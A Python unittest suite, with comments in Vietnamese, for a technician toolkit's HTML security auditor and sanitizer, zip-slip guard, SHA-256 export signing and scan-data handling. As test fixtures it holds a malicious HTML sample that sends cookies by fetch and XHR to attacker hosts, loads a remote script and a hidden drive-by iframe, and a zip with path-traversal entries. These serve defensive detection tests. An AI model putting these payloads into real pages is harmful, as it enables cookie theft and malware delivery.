#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
   SUITE KIỂM THỬ TOÀN DIỆN BẢO MẬT VÀ LOGIC BACKEND WINDOWS 11 TOOLKIT
   Test Suite: Security Audit AST/Regex, Export Task SHA-256, Scan Manager & SMART Reader
==============================================================================
"""

import os
import sys
import json
import zipfile
import hashlib
import tempfile
import shutil
import unittest
import datetime

# Setup paths
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from scripts.security_audit import (
    audit_html_content,
    audit_html_file,
    sanitize_html,
    inspect_zip_package,
    HTMLSecurityASTParser
)
from scripts.export_task import package_task
import scripts.scan_manager as scan_mgr
import scripts.smart_disk_reader as smart_reader

class TestSecurityAuditASTAndRegex(unittest.TestCase):
    """1. Kiểm tra scripts/security_audit.py"""

    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="ktv_test_sec_")

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_1a_clean_html_report(self):
        """1a. File HTML sạch thông thường (report.html)"""
        clean_html = """<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data: blob:; connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none';">
    <title>Báo Cáo Kiểm Tra Máy Tính</title>
    <style>body { font-family: sans-serif; background: #0f172a; color: white; }</style>
</head>
<body>
    <h1>Báo cáo tiếp nhận máy tính</h1>
    <p>Khách hàng: Nguyễn Văn A - Model: Dell Latitude 7490</p>
    <div id="result">100% Linh kiện chuẩn OEM</div>
</body>
</html>"""
        file_path = os.path.join(self.test_dir, "report.html")
        with open(file_path, "wb") as f:
            f.write(clean_html.encode("utf-8"))

        # Tạo file .sha256 chuẩn
        h = hashlib.sha256(clean_html.encode("utf-8")).hexdigest()
        with open(f"{file_path}.sha256", "w", encoding="utf-8") as sf:
            sf.write(f"{h} *report.html\n")

        res = audit_html_file(file_path)
        self.assertTrue(res["is_safe"], "File sạch phải được đánh giá an toàn")
        self.assertEqual(len(res["critical_threats"]), 0, "Không được có critical threat trong file sạch")
        self.assertTrue(res["has_csp"], "Phải nhận diện được thẻ CSP")
        self.assertTrue(res["is_airgapped"], "Phải nhận diện được airgap CSP")
        self.assertTrue(res["sig_match"], "Chữ ký SHA-256 phải khớp 100%")

    def test_1b_malicious_html_injection(self):
        """1b. File HTML bị tiêm mã độc: <script>, <iframe>, event handler, eval, document.cookie, fetch/XHR, binary payload"""
        malicious_html = """<!DOCTYPE html>
<html>
<head>
    <title>Infected Report</title>
    <!-- 1. External remote script -->
    <script src="http://malicious-cdn.xyz/payload.js"></script>
</head>
<body onload="fetch('http://192.168.1.100:9999/steal?data=' + document.cookie)">
    <!-- 2. Hidden iframe drive-by download -->
    <iframe src="http://exploit-kit.ru/drop.exe" width="0" height="0"></iframe>

    <!-- 3. Dangerous event handlers on tags -->
    <img src="invalid_path.jpg" onerror="eval('alert(1)'); window.location='http://evil.com';">
    <button onclick="var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://10.0.0.5/leak'); xhr.send(document.cookie);">Click</button>

    <!-- 4. Dangerous Object tag -->
    <object data="data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA" type="application/x-msdownload"></object>

    <!-- 5. Cookie theft in inline script -->
    <script>
        var leaked = document.cookie;
        sessionStorage.setItem("key", leaked);
        var f = new Function("return document.cookie");
    </script>
</body>
</html>"""
        file_path = os.path.join(self.test_dir, "infected.html")
        with open(file_path, "wb") as f:
            f.write(malicious_html.encode("utf-8"))

        res = audit_html_file(file_path)
        self.assertFalse(res["is_safe"], "File chứa mã độc phải bị đánh giá KHÔNG an toàn")
        self.assertGreater(len(res["critical_threats"]), 0, "Phải phát hiện các mối đe dọa mức CRITICAL")

        threat_ids = [t["id"] for t in res["threats"]]
        # Kiểm tra đầy đủ các loại mã độc theo yêu cầu
        self.assertIn("EXTERNAL_SCRIPT", threat_ids, "Phải phát hiện <script src='http...'>")
        self.assertIn("HIDDEN_IFRAME", threat_ids, "Phải phát hiện iframe")
        self.assertIn("DANGEROUS_EVENT_HANDLER", threat_ids, "Phải phát hiện event handler (onerror, onload, onclick)")
        self.assertIn("COOKIE_THEFT", threat_ids, "Phải phát hiện document.cookie theft")
        self.assertIn("DANGEROUS_EVAL", threat_ids, "Phải phát hiện eval / new Function")
        self.assertIn("EXTERNAL_NETWORK_CALL", threat_ids, "Phải phát hiện fetch / XMLHttpRequest ra IP ngoài")
        self.assertIn("BINARY_PAYLOAD", threat_ids, "Phải phát hiện thuộc tính chứa dữ liệu nhị phân/PE header")

        # Kiểm tra tính năng Khử độc (Sanitization)
        sanitized = sanitize_html(malicious_html)
        self.assertNotIn("<iframe", sanitized.lower(), "Sau khử độc không được còn iframe")
        self.assertNotIn("http://malicious-cdn.xyz", sanitized, "Sau khử độc không còn remote script")
        self.assertNotIn("onerror=", sanitized.lower(), "Sau khử độc không còn onerror")
        self.assertNotIn("onload=", sanitized.lower(), "Sau khử độc không còn onload")
        self.assertNotIn("onclick=", sanitized.lower(), "Sau khử độc không còn onclick")
        self.assertIn("Content-Security-Policy", sanitized, "Sau khử độc phải kích hoạt Content-Security-Policy")

    def test_1c_tampered_html_hash_mismatch(self):
        """1c. File HTML bị sửa nội dung (kiểm tra đối chiếu SHA-256 phát hiện hash mismatch)"""
        original_content = "<html><body><h1>Original Content</h1></body></html>"
        file_path = os.path.join(self.test_dir, "tampered.html")
        with open(file_path, "wb") as f:
            f.write(original_content.encode("utf-8"))

        # Ghi chữ ký SHA-256 ban đầu
        orig_hash = hashlib.sha256(original_content.encode("utf-8")).hexdigest()
        with open(f"{file_path}.sha256", "w", encoding="utf-8") as sf:
            sf.write(f"{orig_hash} *tampered.html\n")

        # Kẻ tấn công hoặc virus chỉnh sửa nội dung file sau đó
        tampered_content = "<html><body><h1>Original Content [MODIFIED BY ATTACKER]</h1></body></html>"
        with open(file_path, "wb") as f:
            f.write(tampered_content.encode("utf-8"))

        res = audit_html_file(file_path)
        self.assertFalse(res["sig_match"], "Phải phát hiện sai lệch chữ ký SHA-256 khi nội dung bị sửa")
        self.assertIn("SAI LỆCH", res["sig_status"], "Trạng thái chữ ký phải báo SAI LỆCH")
        self.assertFalse(res["is_safe"], "File bị chỉnh sửa hash không khớp phải bị đánh dấu không an toàn")

    def test_1d_zip_slip_and_malicious_archive(self):
        """1d. File ZIP giả mạo hoặc chứa path traversal (../) và file thực thi"""
        zip_path = os.path.join(self.test_dir, "malicious_package.zip")
        extract_dir = os.path.join(self.test_dir, "extract_sandbox")

        with zipfile.ZipFile(zip_path, "w") as zf:
            # Safe member
            zf.writestr("task/report.html", "<html><body>Report</body></html>")
            # Path Traversal attack (Zip Slip)
            zf.writestr("../evil_startup.bat", "calc.exe")
            zf.writestr("..\\..\\windows\\system32\\trojan.dll", "payload")
            # Executable files
            zf.writestr("task/malware.exe", b"MZDummyPEHeader")
            zf.writestr("task/stealer.vbs", "WScript.Echo 'evil'")

        zip_res = inspect_zip_package(zip_path, extract_target_dir=extract_dir)

        self.assertFalse(zip_res["is_safe"], "Gói zip chứa path traversal và file thực thi phải bị báo không an toàn")
        self.assertGreaterEqual(len(zip_res["blocked_traversal"]), 2, "Phải chặn ít nhất 2 tệp path traversal (../ và ..\\)")
        self.assertIn("../evil_startup.bat", zip_res["blocked_traversal"])
        self.assertGreaterEqual(len(zip_res["blocked_dangerous_exts"]), 2, "Phải chặn các file .exe và .vbs")

        # Kiểm tra thư mục giải nén cách ly: không chứa file nguy hiểm
        extracted_files = []
        for root, _, files in os.walk(extract_dir):
            for file in files:
                extracted_files.append(file)

        self.assertNotIn("evil_startup.bat", extracted_files, "Không được phép giải nén tệp path traversal")
        self.assertNotIn("malware.exe", extracted_files, "Không được phép giải nén tệp .exe")
        self.assertNotIn("trojan.dll", extracted_files, "Không được phép giải nén tệp .dll")
        self.assertIn("report.html", extracted_files, "Tệp an toàn report.html vẫn phải được giải nén bình thường")


class TestExportTaskPackagingAndSHA256(unittest.TestCase):
    """2. Kiểm tra scripts/export_task.py"""

    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="ktv_test_export_")
        self.task_dir = os.path.join(self.test_dir, "TestCustomer_TiepNhan_PC01_20261015_120000")
        os.makedirs(self.task_dir, exist_ok=True)

        # Tạo file report.html mẫu
        self.report_content = "<html><head><title>Report</title></head><body><h1>Report PC01</h1></body></html>"
        self.report_path = os.path.join(self.task_dir, "report.html")
        with open(self.report_path, "wb") as f:
            f.write(self.report_content.encode("utf-8"))

        # Tạo info.json mẫu
        self.info_data = {
            "scan_id": "TestCustomer_TiepNhan_PC01_20261015_120000",
            "customer_name": "Test Customer",
            "computer_name": "PC01",
            "scan_stage": "tiep_nhan",
            "stage_label": "Tiếp Nhận",
            "scan_time": "15/10/2026 12:00:00"
        }
        with open(os.path.join(self.task_dir, "info.json"), "w", encoding="utf-8") as f:
            json.dump(self.info_data, f, indent=2)

        # Tạo apps.json mẫu
        self.apps_data = [{"name": "Google Chrome", "version": "120.0"}]
        with open(os.path.join(self.task_dir, "apps.json"), "w", encoding="utf-8") as f:
            json.dump(self.apps_data, f, indent=2)

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_2_package_and_verify_sha256(self):
        """Kiểm tra đóng gói zip và xác minh chữ ký .sha256 khớp tuyệt đối hashlib.sha256"""
        output_zip = os.path.join(self.test_dir, "EXPORTED_PACKAGE.zip")
        res = package_task(self.task_dir, output_zip_path=output_zip)

        self.assertIsNotNone(res, "package_task phải trả về dict kết quả")
        self.assertTrue(os.path.exists(output_zip), "File zip phải được tạo thành công")
        self.assertTrue(os.path.exists(f"{output_zip}.sha256"), "File .sha256 cho file zip phải được tạo")

        # 1. Kiểm tra SHA-256 của file ZIP thực tế
        with open(output_zip, "rb") as zf:
            real_zip_hash = hashlib.sha256(zf.read()).hexdigest()
        with open(f"{output_zip}.sha256", "r", encoding="utf-8") as zsf:
            stored_zip_hash = zsf.read().strip().split()[0]

        self.assertEqual(real_zip_hash.lower(), stored_zip_hash.lower(),
                         "Chữ ký trong file .sha256 của file ZIP phải khớp 100% với hashlib.sha256 thực tế")

        # 2. Kiểm tra SHA-256 của report.html bên trong thư mục task
        report_sha_file = f"{self.report_path}.sha256"
        self.assertTrue(os.path.exists(report_sha_file), "File report.html.sha256 phải được sinh ra")
        with open(self.report_path, "rb") as rf:
            real_report_hash = hashlib.sha256(rf.read()).hexdigest()
        with open(report_sha_file, "r", encoding="utf-8") as rsf:
            stored_report_hash = rsf.read().strip().split()[0]

        self.assertEqual(real_report_hash.lower(), stored_report_hash.lower(),
                         "Chữ ký trong report.html.sha256 phải khớp 100% với hashlib.sha256 thực tế")


class TestScanManagerAndSmartReader(unittest.TestCase):
    """3. Kiểm tra scripts/scan_manager.py và scripts/smart_disk_reader.py"""

    def setUp(self):
        self.test_scans_dir = tempfile.mkdtemp(prefix="ktv_test_scanmgr_")
        self.orig_scans_dir = scan_mgr.SCANS_DIR
        scan_mgr.SCANS_DIR = self.test_scans_dir
        smart_reader.SCANS_DIR = self.test_scans_dir

    def tearDown(self):
        scan_mgr.SCANS_DIR = self.orig_scans_dir
        smart_reader.SCANS_DIR = self.orig_scans_dir
        shutil.rmtree(self.test_scans_dir, ignore_errors=True)

    def test_3a_save_and_read_integrity(self):
        """Kiểm tra tính toàn vẹn khi lưu trữ và đọc info.json, apps.json, task lock status"""
        machine_info = {
            "scan_id": "KH01_TiepNhan_DESKTOP-TEST_20261015_150000",
            "customer_name": "Nguyen Van B",
            "computer_name": "DESKTOP-TEST",
            "serial_number": "SN-123456",
            "machine_guid": "guid-test-abc",
            "scan_stage": "tiep_nhan",
            "stage_label": "Tiếp Nhận",
            "scan_time": datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "timestamp_raw": datetime.datetime.now().isoformat()
        }
        apps_info = [
            {"name": "VLC Media Player", "version": "3.0.18", "publisher": "VideoLAN"},
            {"name": "Zalo", "version": "24.5.1", "publisher": "VNG"}
        ]

        # Lưu task
        saved_info = scan_mgr.save_scan_task(machine_info, apps_info)
        self.assertIsNotNone(saved_info)

        # Đọc task
        task = scan_mgr.get_scan_task(machine_info["scan_id"])
        self.assertIsNotNone(task, "get_scan_task phải lấy được dữ liệu task vừa lưu")
        self.assertEqual(task["info"]["customer_name"], "Nguyen Van B")
        self.assertEqual(len(task["apps"]), 2)

        # Kiểm tra task lock: máy hiện tại và vừa mới tạo -> Không bị khóa
        lock_status = scan_mgr.check_task_lock(machine_info["scan_id"])
        # Nếu serial/pc khớp hoặc không cấu hình strict mismatch
        self.assertIn("is_locked", lock_status)
        self.assertIn("lock_duration_hours", lock_status)

    def test_3b_exception_handling_corrupted_json_and_missing_files(self):
        """Kiểm tra xử lý ngoại lệ khi thiếu file hoặc dữ liệu bị hỏng"""
        task_id = "CorruptedTask_TiepNhan_PC99_20261015_160000"
        task_path = os.path.join(self.test_scans_dir, task_id)
        os.makedirs(task_path, exist_ok=True)

        # 1. info.json bị hỏng cấu trúc cú pháp JSON (chứa chuỗi rác)
        with open(os.path.join(task_path, "info.json"), "w", encoding="utf-8") as f:
            f.write("{ invalid json content: true,,, ")

        # 2. apps.json bị rỗng (0 bytes)
        with open(os.path.join(task_path, "apps.json"), "w", encoding="utf-8") as f:
            f.write("")

        # get_scan_task KHÔNG ĐƯỢC CRASH / NÉM NGOẠI LỆ UNHANDLED
        try:
            task = scan_mgr.get_scan_task(task_id)
            # Vì info.json bị hỏng cú pháp, get_scan_task phải trả về None thay vì sập server
            self.assertIsNone(task, "File info.json bị hỏng cú pháp phải được xử lý an toàn, trả về None")
        except Exception as e:
            self.fail(f"get_scan_task bị ném ngoại lệ khi gặp file hỏng: {e}")

        # check_task_lock KHÔNG ĐƯỢC CRASH
        try:
            lock = scan_mgr.check_task_lock(task_id)
            self.assertFalse(lock["is_locked"], "Task hỏng không được gây crash check_task_lock")
        except Exception as e:
            self.fail(f"check_task_lock bị ném ngoại lệ: {e}")

        # 3. smart_disk_reader: kiểm tra xử lý tệp smart_info.json bị hỏng
        with open(os.path.join(task_path, "smart_info.json"), "w", encoding="utf-8") as f:
            f.write("{ corrupted disk json: 123... ")

        smart_res = smart_reader.read_smart_info(task_id)
        self.assertEqual(smart_res["status"], "corrupted", "Phải nhận diện trạng thái corrupted")
        self.assertIsNotNone(smart_res["disks"], "Phải có danh sách disks fallback an toàn cho giao diện")
        self.assertGreater(len(smart_res["disks"]), 0, "Disks fallback phải có ít nhất 1 ổ mặc định")

        # 4. smart_disk_reader: kiểm tra khi hoàn toàn thiếu file smart_info.json
        missing_task_id = "NonExistentTask"
        smart_missing = smart_reader.read_smart_info(missing_task_id)
        self.assertEqual(smart_missing["status"], "missing", "Thiếu task/file phải trả về trạng thái missing")
        self.assertIsNotNone(smart_missing["disks"], "Thiếu file vẫn phải trả về fallback an toàn")

def run_tests():
    print("=" * 78)
    print("   BẮT ĐẦU CHẠY TOÀN BỘ BỘ KIỂM THỬ BẢO MẬT & BACKEND KTV TOOLKIT")
    print("=" * 78)
    suite = unittest.TestSuite()
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestSecurityAuditASTAndRegex))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestExportTaskPackagingAndSHA256))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestScanManagerAndSmartReader))
    
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return result

if __name__ == "__main__":
    res = run_tests()
    sys.exit(0 if res.wasSuccessful() else 1)
